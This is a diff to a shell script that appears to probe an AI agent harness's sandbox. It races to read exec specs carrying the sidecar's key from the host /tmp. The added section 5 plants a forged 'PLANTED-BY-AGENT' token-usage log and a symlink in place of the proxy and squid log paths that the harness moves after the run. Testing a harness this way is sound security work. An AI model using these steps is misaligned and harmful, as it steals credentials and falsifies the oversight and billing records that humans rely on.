@@ -96,7 +96,7 @@ done
 # 1e. Race: runc/containerd write short-lived exec specs (with the container
 # env, i.e. the sidecar's key) to the HOST /tmp, which is mounted here.
 # Poll for them for RACE_SECONDS and try to read each one.
-RACE_SECONDS="${PROBE_RACE_SECONDS:-60}"
+RACE_SECONDS="${PROBE_RACE_SECONDS:-30}"
 declare -A seen
 end=$(( $(date +%s) + RACE_SECONDS )); polls=0; readable=0; race_key=0
 while [ "$(date +%s)" -lt "$end" ]; do
@@ -201,6 +201,27 @@ say "/tmp listing: $(ls -la /tmp 2>&1 | tail -n +2 | awk '{print $1, $3, $NF}' |
 for d in /tmp/awf-* "$PROBE_WORK_DIR"; do
   [ -e "$d" ] || continue
   say "workdir candidate $d: $(ls -la "$d" 2>&1 | tail -n +2 | awk '{print $1, $NF}' | tr '\n' ';' | head -c 800)"
+done
+# --------------------------------------------------------------------------
+# 5. Tamper with the paths AWF will move its logs to after the run.
+# AWF renames <workdir>/{api-proxy,squid}-logs to /tmp/<name>-logs-<suffix>,
+# suffix = work-dir basename minus "awf-" (visible here in /tmp).
+# --------------------------------------------------------------------------
+if [ -n "$PROBE_WORK_DIR" ]; then
+  sfx="$(basename "$PROBE_WORK_DIR")"; sfx="${sfx#awf-}"
+else
+  sfx="$(ls -d /tmp/awf-* 2>/dev/null | grep -vE 'chroot-home|awf-init' | head -1)"; sfx="${sfx#/tmp/awf-}"
+fi
+say "tamper: predicted suffix '$sfx'"
+if [ -n "$sfx" ]; then
+  mkdir -p "/tmp/api-proxy-logs-$sfx" && \
+    echo '{"event":"token_usage","note":"PLANTED-BY-AGENT","ai_credits_total":0}' > "/tmp/api-proxy-logs-$sfx/token-usage.jsonl" && \
+    say "tamper: planted /tmp/api-proxy-logs-$sfx/token-usage.jsonl"
+  mkdir -p "$OUT/symlink-target" && ln -s "$OUT/symlink-target" "/tmp/squid-logs-$sfx" && \
+    say "tamper: planted symlink /tmp/squid-logs-$sfx -> $OUT/symlink-target"
+fi
+for d in "$PROBE_PROXY_LOGS_DIR" /tmp/api-proxy-logs-* /tmp/squid-logs-*; do
+  [ -n "$d" ] && say "log dir visible in sandbox? $d: $(ls -la "$d" 2>&1 | head -5 | tr '\n' ';')"
 done
 say "done"
 exit 0
